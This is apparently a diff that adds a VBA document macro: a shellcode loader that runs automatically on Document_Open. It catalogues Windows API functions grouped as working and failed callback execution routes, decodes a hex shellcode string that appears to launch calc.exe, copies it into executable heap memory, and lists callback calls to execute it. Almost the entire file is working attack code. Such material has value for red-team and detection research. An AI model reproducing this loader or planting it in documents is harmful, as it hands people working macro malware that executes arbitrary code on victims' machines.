@@ -1,0 +1,377 @@
+' ###############################
+' # MEMORY ALLOCATION FUNCTIONS #
+' ###############################
+
+'Private Declare Function allocateMemory Lib "kernel32" Alias "VirtualAlloc" (ByVal lpaddr As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+'Private Declare Function allocateMemory Lib "ntdll" Alias "NtAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
+'Private Declare Function allocateMemory Lib "ntdll" Alias "ZwAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
+'Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
+'Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
+
+' ##########################
+' # WRITE MEMORY FUNCTIONS #
+' ##########################
+
+'Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
+'Private Declare Function copyMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+
+' ########################
+' # SUPPORTING FUNCTIONS #
+' ########################
+
+Private Declare Function getWindowHandle Lib "user32" Alias "GetActiveWindow" () As Long
+Private Declare Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As Long
+Private Declare Function getThreadHandle Lib "kernel32" Alias "GetCurrentThread" () As Long
+Private Declare Function getModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
+
+' #############################
+' # SHELLCODE PIVOT FUNCTIONS #
+' #############################
+
+' #####################
+' # WORKING FUNCTIONS #
+' #####################
+
+'Private Declare Function shellExecute Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Any, ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "CallWindowProcW" (ByVal lpPrevWndFunc As Any, ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxIndirectParamA" (ByVal hInstance As Any, ByVal hDialogTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxIndirectParamW" (ByVal hInstance As Any, ByVal hDialogTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumCalendarInfoA" (ByVal pCalInfoEnumProc As Any, ByVal Locale As Any, ByVal Calendar As Any, ByVal CalType As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumCalendarInfoW" (ByVal pCalInfoEnumProc As Any, ByVal Locale As Any, ByVal Calendar As Any, ByVal CalType As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumDateFormatsA" (ByVal lpDateFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumDateFormatsW" (ByVal lpDateFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopWindows" (ByVal hDesktop As Any, ByVal lpfn As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopsA" (ByVal hwinsta As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopsW" (ByVal hwinsta As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesA" (ByVal lpLangGroupLocaleEnumProc As Any, ByVal LanguageGroup As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesW" (ByVal lpLangGroupLocaleEnumProc As Any, ByVal LanguageGroup As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumPropsExA" (ByVal hWnd As Any, ByVal lpEnumFunc As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumPropsExW" (ByVal hWnd As Any, ByVal lpEnumFunc As Any) As Long
+'Private Declare Function shellExecute Lib "powrprof" Alias "EnumPwrSchemes" (ByVal lpfnPwrSchemesEnumProc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesA" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesW" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesExA" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesExW" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesA" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsA" (ByVal lpLanguageGroupEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsW" (ByVal lpLanguageGroupEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal lpLocaleEnumProc As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLocalesW" (ByVal lpLocaleEnumProc As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumThreadWindows" (ByVal dwThreadId As Any, ByVal lpfn As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumTimeFormatsA" (ByVal lpTimeFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumTimeFormatsW" (ByVal lpTimeFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumUILanguagesA" (ByVal lpUILanguageEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumUILanguagesW" (ByVal lpUILanguageEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumWindowStationsA" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumWindowStationsW" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumWindows" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModules" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesEx" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "GrayStringA" (ByVal hDC As Any, ByVal hBrush As Any, ByVal lpOutputFunc As Any, ByVal lpData As Any, ByVal nCount As Any, ByVal X As Any, ByVal Y As Any, ByVal nWidth As Any, ByVal nHeight As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "GrayStringW" (ByVal hDC As Any, ByVal hBrush As Any, ByVal lpOutputFunc As Any, ByVal lpData As Any, ByVal nCount As Any, ByVal X As Any, ByVal Y As Any, ByVal nWidth As Any, ByVal nHeight As Any) As Long
+'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyIpInterfaceChange" (ByVal Family As Any, ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long
+'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyTeredoPortChange" (ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long
+'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyUnicastIpAddressChange" (ByVal Family As Any, ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long
+'Private Declare Function shellExecute Lib "shlwapi" Alias "SHCreateThread" (ByVal pfnThreadProc As Any, ByVal pData As Any, ByVal dwFlags As Any, ByVal pfnCallback As Any) As Long
+'Private Declare Function shellExecute Lib "shlwapi" Alias "SHCreateThreadWithHandle" (ByVal pfnThreadProc As Any, ByVal pData As Any, ByVal flags As Any, ByVal pfnCallback As Any, ByVal pHandle As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "SendMessageCallbackA" (ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any, ByVal lpCallBack As Any, ByVal dwData As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "SendMessageCallbackW" (ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any, ByVal lpCallBack As Any, ByVal dwData As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "SetWinEventHook" (ByVal eventMin As Any, ByVal eventMax As Any, ByVal hmodWinEventProc As Any, ByVal lpfnWinEventProc As Any, ByVal idProcess As Any, ByVal idThread As Any, ByVal dwflags As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Any, ByVal lpfn As Any, ByVal hMod As Any, ByVal dwThreadId As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "SetWindowsHookExW" (ByVal idHook As Any, ByVal lpfn As Any, ByVal hMod As Any, ByVal dwThreadId As Any) As Long
+
+' ##################
+' FAILED FUNCTIONS #
+' ##################
+
+'Private Declare Function shellExecute Lib "clusapi" Alias "AddClusterNode" (ByVal hCluster As Any, ByVal lpszNodeName As Any, ByVal pfnProgressCallBack As Any, ByVal pvCallbackArg As Any) As Long
+'Private Declare Function shellExecute Lib "bthprops" Alias "BluetoothRegisterForAuthentication" (ByVal pbtdi As Any, ByVal phRegHandle As Any, ByVal pfnCallback As Any, ByVal pvParam As Any) As Long
+'Private Declare Function shellExecute Lib "icm32" Alias "CMTranslateRGBsExt" (ByVal hcmTransform As Any, ByVal lpSrcBits As Any, ByVal bmInput As Any, ByVal dwWidth As Any, ByVal dwHeight As Any, ByVal dwInputStride As Any, ByVal lpDestBits As Any, ByVal bmOutput As Any, ByVal dwOutputStride As Any, ByVal lpfnCallback As Any, ByVal ulCallbackData As Any) As Long
+'Private Declare Function shellExecute Lib "clusapi" Alias "CreateCluster" (ByVal pConfig As Any, ByVal pfnProgressCallBack As Any, ByVal pvCallbackArg As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "CreateDialogIndirectParamA" (ByVal hInstance As Any, ByVal lpTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal lParamInit As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "CreateDialogIndirectParamW" (ByVal hInstance As Any, ByVal lpTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal lParamInit As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "CreateDialogParamA" (ByVal hInstance As Any, ByVal lpTemplateName As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "CreateDialogParamW" (ByVal hInstance As Any, ByVal lpTemplateName As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "spoolss" Alias "CreatePrintAsyncNotifyChannel" (ByVal pName As Any, ByVal pSchema As Any, ByVal filter As Any, ByVal directionality As Any, ByVal pCallback As Any, ByVal ppChannel As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "CreateTimerQueueTimer" (ByVal phNewTimer As Any, ByVal TimerQueue As Any, ByVal Callback As Any, ByVal Parameter As Any, ByVal DueTime As Any, ByVal Period As Any, ByVal Flags As Any) As Long
+'Private Declare Function shellExecute Lib "davcint" Alias "DavRegisterAuthCallback" (ByVal Callback As Any, ByVal Version As Any) As Long
+'Private Declare Function shellExecute Lib "clusapi" Alias "DestroyCluster" (ByVal hCluster As Any, ByVal pfnProgressCallback As Any, ByVal pvCallbackArg As Any, ByVal fdeleteVirtualComputerObjects As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxParamA" (ByVal hInstance As Any, ByVal lpTemplateName As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxParamW" (ByVal hInstance As Any, ByVal lpTemplateName As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DrawStateA" (ByVal hdc As Any, ByVal hbr As Any, ByVal lpOutputFunc As Any, ByVal lData As Any, ByVal wData As Any, ByVal x As Any, ByVal y As Any, ByVal cx As Any, ByVal cy As Any, ByVal fuFlags As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "DrawStateW" (ByVal hdc As Any, ByVal hbr As Any, ByVal lpOutputFunc As Any, ByVal lData As Any, ByVal wData As Any, ByVal x As Any, ByVal y As Any, ByVal cx As Any, ByVal cy As Any, ByVal fuFlags As Any) As Long
+'Private Declare Function shellExecute Lib "user32" Alias "EnumChildWindows" (hWndParent As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumEnhMetaFile" (ByVal hdc As Any, ByVal hemf As Any, ByVal lpEnhMetaFunc As Any, ByVal lpData As Any, ByVal lpRect As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontFamiliesA" (ByVal hdc As Any, ByVal lpszFamily As Any, ByVal lpEnumFontFamProc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontFamiliesW" (ByVal hdc As Any, ByVal lpszFamily As Any, ByVal lpEnumFontFamProc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontFamiliesExA" (ByVal hdc As Any, ByVal lpszFamily As Any, ByVal lpEnumFontFamExProc As Any, ByVal lParam As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontFamiliesExW" (ByVal hdc As Any, ByVal lpszFamily As Any, ByVal lpEnumFontFamExProc As Any, ByVal lParam As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontsA" (ByVal hdc As Any, lpFaceName As Any, ByVal lpFontFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumFontsW" (ByVal hdc As Any, lpFaceName As Any, ByVal lpFontFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumICMProfilesA" (ByVal hdc As Any, ByVal lpEnumICMProfilesFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumICMProfilesW" (ByVal hdc As Any, ByVal lpEnumICMProfilesFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumMetaFile" (ByVal hdc As Any, ByVal hmf As Any, ByVal lpMetaFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "EnumObjects" (ByVal hdc As Any, ByVal nObjectType As Any, ByVal lpObjectFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceLanguagesA" (ByVal hModule As Any, ByVal lpType As Any, ByVal lpName As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceLanguagesW" (ByVal hModule As Any, ByVal lpType As Any, ByVal lpName As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceLanguagesExA" (ByVal hModule As Any, ByVal lpType As Any, ByVal lpName As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceLanguagesExW" (ByVal hModule As Any, ByVal lpType As Any, ByVal lpName As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, byval dwFlags as Any, byval LangId as Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceNamesA" (ByVal hModule As Any, ByVal lpszType As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceNamesW" (ByVal hModule As Any, ByVal lpszType As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceNamesExA" (ByVal hModule As Any, ByVal lpszType As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceNamesExW" (ByVal hModule As Any, ByVal lpszType As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "EventRegister" (ByVal ProviderId As Any, ByVal EnableCallback As Any, ByVal CallbackContext As Any, ByVal RegHandle As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "GetApplicationRecoveryCallback" (ByVal hProcess As Any, ByVal pRecoveryCallback As Any, ByVal ppvParameter As Any, ByVal pdwPingInterval As Any, ByVal pdwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "gdi32" Alias "LineDDA" (ByVal nXStart As Any, ByVal nYStart As Any, ByVal nXEnd As Any, ByVal nYEnd As Any, ByVal lpLineFunc As Any, ByVal lpData As Any) As Long
+'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyStableUnicastIpAddressTable" (ByVal Family As Any, ByVal Table As Any, ByVal CallerCallback As Any, ByVal CallerContext As Any, ByVal NotificationHandle As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "PerfStartProvider" (ByVal ProviderGuid As Any, ByVal ControlCallback As Any, ByVal phProvider As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "ReadEncryptedFileRaw" (ByVal pfExportCallback As Any, ByVal pvCallbackContext As Any, ByVal pvContext As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "RegisterApplicationRecoveryCallback" (ByVal pRecoveryCallback As Any, ByVal pvParameter As Any, ByVal dwPingInterval As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "spoolss" Alias "RegisterForPrintAsyncNotifications" (ByVal pName As Any, ByVal pSchema As Any, ByVal filter As Any, ByVal directionality As Any, ByVal pCallback As Any, ByVal pRegistrationHandler As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "RegisterServiceCtrlHandlerExA" (ByVal lpServiceName As Any, ByVal lpHandlerProc As Any, ByVal lpContext As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "RegisterServiceCtrlHandlerExW" (ByVal lpServiceName As Any, ByVal lpHandlerProc As Any, ByVal lpContext As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "RegisterWaitForSingleObject" (ByVal phNewWaitObject As Any, ByVal hObject As Any, ByVal Callback As Any, ByVal Context As Any, ByVal dwMilliseconds As Any, ByVal dwFlags As Any) As Long
+'Private Declare Function shellExecute Lib "kernel32" Alias "SetTimerQueueTimer" (ByVal phNewTimer As Any, ByVal TimerQueue As Any, ByVal Callback As Any, ByVal Parameter As Any, ByVal DueTime As Any, ByVal Period As Any, ByVal Flags As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "SymEnumLines" (ByVal hProcess As Any, ByVal Base As Any, ByVal Obj As Any, ByVal File As Any, ByVal EnumLinesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "SymEnumLinesW" (ByVal hProcess As Any, ByVal Base As Any, ByVal Obj As Any, ByVal File As Any, ByVal EnumLinesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "SymEnumProcesses" (ByVal EnumProcessesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "SymEnumSourceLines" (ByVal hProcess As Any, ByVal Base As Any, ByVal Obj As Any, ByVal File As Any, ByVal Line As Any, ByVal Flags As Any, ByVal EnumLinesCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "dbghelp" Alias "SymEnumSymbols" (ByVal hProcess As Any, ByVal BaseOfDll As Any, ByVal Mask As Any, ByVal EnumSymbolsCallback As Any, ByVal UserContext As Any) As Long
+'Private Declare Function shellExecute Lib "mscms" Alias "TranslateBitmapBits" (ByVal hColorTransform As Any, ByVal pSrcBits As Any, ByVal bmInput As Any, ByVal dwWidth As Any, ByVal dwHeight As Any, ByVal dwInputStride As Any, ByVal pDestBits As Any, ByVal bmOutput As Any, ByVal dwOutputStride As Any, ByVal pfnCallback As Any, ByVal ulCallbackData As Any) As Long
+'Private Declare Function shellExecute Lib "ws2spi" Alias "WPUQueryBlockingCallback" (ByVal dwCatalogEntryId As Any, ByVal lplpfnCallback As Any, ByVal lpdwContext As Any, ByVal lpErrno As Any) As Long
+'Private Declare Function shellExecute Lib "wdsclientapi" Alias "WdsCliTransferFile" (ByVal pwszServer As Any, ByVal pwszNamespace As Any, ByVal pwszRemoteFilePath As Any, ByVal pwszLocalFilePath As Any, ByVal dwFlags As Any, ByVal dwReserved As Any, ByVal pfnWdsCliCallback As Any, ByVal pvUserData As Any, ByVal phTransfer As Any) As Long
+'Private Declare Function shellExecute Lib "wlanapi" Alias "WlanRegisterNotification" (ByVal hClientHandle As Any, ByVal dwNotifSource As Any, ByVal bIgnoreDuplicate As Any, ByVal funcCallback As Any, ByVal pCallbackContext As Any, ByVal pReserved As Any, ByVal pdwdPrevNotifSource As Any) As Long
+'Private Declare Function shellExecute Lib "advapi32" Alias "WriteEncryptedFileRaw" (ByVal pfImportCallback As Any, ByVal pvCallbackContext As Any, ByVal pvContext As Any) As Long
+'Private Declare Function shellExecute Lib "webservices" Alias "WsPullBytes" (ByVal writer As Any, ByVal callback As Any, ByVal callbackState As Any, ByVal error As Any) As Long
+'Private Declare Function shellExecute Lib "winmm" Alias "mciSetYieldProc" (ByVal IDDevice As Any, ByVal yp As Any, ByVal dwYieldData As Any) As Long
+'Private Declare Function shellExecute Lib "winmm" Alias "midiInOpen" (ByVal lphMidiIn As Any, ByVal uDeviceID As Any, ByVal dwCallback As Any, ByVal dwCallbackInstance As Any, ByVal dwFlags As Any) As Long
+
+' ###############
+' # MACRO START #
+' ###############
+
+Private Sub Document_Open()
+
+Stop
+
+' #####################
+' # Declare Variables #
+' #####################
+
+Dim shellCode As String
+
+Dim shellLength As Byte
+Dim byteArray() As Byte
+
+Dim memoryAddress As Long
+
+Dim windowHandle As Long
+Dim ProcessHandle As Long
+Dim threadHandle As Long
+Dim moduleHandle As Long
+
+Dim zL As Long
+Dim oL As Long
+Dim rL As Long
+
+zL = 0
+oL = 1
+
+windowHandle = getWindowHandle()
+ProcessHandle = getProcessHandle()
+threadHandle = getThreadHandle()
+moduleHandle = getModuleHandle(vbNullString)
+
+' #############
+' # Shellcode #
+' #############
+
+shellCode = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6a018d85b90000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
+
+' ##############
+' # Byte Array #
+' ##############
+
+shellLength = Len(shellCode) / 2
+
+ReDim byteArray(0 To shellLength)
+
+' ###############################
+' # Convert Hex String to Bytes #
+' ###############################
+
+For i = 0 To shellLength - 1
+
+    If i = 0 Then
+        pos = i + 1
+    Else
+        pos = i * 2 + 1
+    End If
+    Value = Mid(shellCode, pos, 2)
+    byteArray(i) = Val("&H" & Value)
+    
+Next
+
+' ###################   
+' # Allocate Memory #
+' ###################
+
+Stop
+
+' flAllocationType 0x1000 = MEM_COMMIT
+' flProtect 0x40 = PAGE_EXECUTE_READWRITE
+'memoryAddress = allocateMemory(zL, &H5000, &H1000, &H40) ' WORK VirtualAlloc
+
+'memoryAddress = allocateMemory(ByVal -1, rL, zL, &H5000, &H1000, &H40) ' WORK NtAllocateVirtualMemory / ZwAllocateVirtualMemory
+'memoryAddress = rL
+
+' flOptions 0x40000 = HEAP_CREATE_ENABLE_EXECUTE
+rL = createMemory(&H40000, zL, zL)
+memoryAddress = allocateMemory(rL, zL, &H5000) ' WORK HeapAlloc
+
+' #############################
+' # Write Shellcode to Memory #
+' #############################
+
+Stop
+
+'copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1  ' WORK RtlMoveMemory
+
+copyMemory ByVal -1, memoryAddress, VarPtr(byteArray(0)), UBound(byteArray) + 1, zL ' WORK WriteProcessMemory
+
+' #####################
+' # Execute Shellcode #
+' #####################
+
+'MsgBox (Hex(memoryAddress))
+
+Stop
+
+' #####################
+' # WORKING FUNCTIONS #
+' #####################
+
+'executeResult = shellExecute(memoryAddress, zL, zL, zL, zL) ' WORK CallWindowProcA
+'executeResult = shellExecute(memoryAddress, zL, zL, zL, zL) ' WORK CallWindowProcW
+'executeResult = shellExecute(moduleHandle, moduleHandle, windowHandle, memoryAddress, oL) ' WORK DialogBoxIndirectParamA
+'executeResult = shellExecute(moduleHandle, moduleHandle, windowHandle, memoryAddress, oL) ' WORK DialogBoxIndirectParamW
+'rL = 3072 ' LOCALE_CUSTOM_DEFAULT
+'executeResult = shellExecute(memoryAddress, rL, oL, oL)  ' WORK EnumCalendarInfoA
+'rL = 3072 ' LOCALE_CUSTOM_DEFAULT
+'executeResult = shellExecute(memoryAddress, rL, oL, oL)  ' WORK EnumCalendarInfoW
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumDateFormatsA
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumDateFormatsW
+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumDesktopWindows
+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumDesktopsA
+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumDesktopsW
+'executeResult = shellExecute(memoryAddress, oL, zL, zL) ' WORK EnumLanguageGroupLocalesA
+'executeResult = shellExecute(memoryAddress, oL, zL, zL) ' WORK EnumLanguageGroupLocalesW
+'executeResult = shellExecute(windowHandle, memoryAddress) ' WORK EnumPropsExA
+'executeResult = shellExecute(windowHandle, memoryAddress) ' WORK EnumPropsExW
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumPwrSchemes
+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumResourceTypesA 			
+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumResourceTypesW
+'executeResult = shellExecute(zL, memoryAddress, zL, zL, zL) ' WORK EnumResourceTypesExA
+'executeResult = shellExecute(zL, memoryAddress, zL, zL, zL) ' WORK EnumResourceTypesExW
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumSystemCodePagesA
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumSystemCodePagesW
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumSystemLanguageGroupsA
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumSystemLanguageGroupsW
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumSystemLocalesA
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumSystemLocalesW
